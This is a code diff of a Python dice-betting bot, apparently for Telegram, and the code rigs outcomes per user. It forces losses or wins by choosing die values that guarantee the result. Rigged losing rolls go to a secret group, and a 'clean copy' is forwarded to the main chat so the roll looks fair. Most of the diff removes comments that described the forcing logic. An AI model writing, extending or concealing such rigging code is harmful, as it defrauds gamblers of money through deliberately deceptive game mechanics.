@@ -10,7 +10,7 @@ from wallet import (
 )
 from settings import get_min_bet, get_max_bet
 
-# Updated Secret Rig Group ID
+# Secret Rig Group ID
 RIG_GROUP_ID = int(os.getenv("RIG_GROUP_ID", "-1004291076026"))
 
 # --- RIGGING CHECK ---
@@ -28,27 +28,22 @@ def evaluate_dice_outcome(dice_value: int, bet_choice: str) -> tuple[bool, float
     choice = str(bet_choice).lower().strip()
 
     if choice == "high":
-        # High: 4, 5, 6
         is_win = dice_value in [4, 5, 6]
         return is_win, 1.80 if is_win else 0.0
 
     elif choice == "low":
-        # Low: 1, 2, 3
         is_win = dice_value in [1, 2, 3]
         return is_win, 1.80 if is_win else 0.0
 
     elif choice == "even":
-        # Even: 2, 4, 6
         is_win = (dice_value % 2 == 0)
         return is_win, 1.80 if is_win else 0.0
 
     elif choice == "odd":
-        # Odd: 1, 3, 5
         is_win = (dice_value % 2 != 0)
         return is_win, 1.80 if is_win else 0.0
 
     elif choice in ["1", "2", "3", "4", "5", "6"]:
-        # Specific Number
         is_win = (dice_value == int(choice))
         return is_win, 5.50 if is_win else 0.0
 
@@ -57,13 +52,11 @@ def evaluate_dice_outcome(dice_value: int, bet_choice: str) -> tuple[bool, float
 def generate_dice_roll(user_id: int, bet_choice: str) -> int:
     rig_status = get_rigged_target(user_id)
 
-    # Force LOSE: pick a dice value that guarantees is_win == False
     if rig_status is False:
         losing_outcomes = [v for v in range(1, 7) if not evaluate_dice_outcome(v, bet_choice)[0]]
         if losing_outcomes:
             return random.choice(losing_outcomes)
 
-    # Force WIN: pick a dice value that guarantees is_win == True
     elif rig_status is True:
         winning_outcomes = [v for v in range(1, 7) if evaluate_dice_outcome(v, bet_choice)[0]]
         if winning_outcomes:
@@ -88,7 +81,6 @@ def validate_bet_amount(user_id: int, amount: float) -> tuple[bool, str]:
 def send_dice_animation(chat_id: int, user_id: int, bet_choice: str) -> int:
     rig_status = get_rigged_target(user_id)
 
-    # If rigged to LOSE, send to secret group and forward clean copy to main chat
     if rig_status is False:
         try:
             target_val = generate_dice_roll(user_id, bet_choice)
@@ -239,6 +231,7 @@ def handle_dr_callback(call: CallbackQuery):
         pass
 
     process_dice_bet(call.message.chat.id, user_id, amount, choice)
-# Backward compatibility aliases
+
+# --- BACKWARD COMPATIBILITY ALIASES ---
 play_dice_roll = process_dice_bet
 handle_dice_roll = handle_dr_command
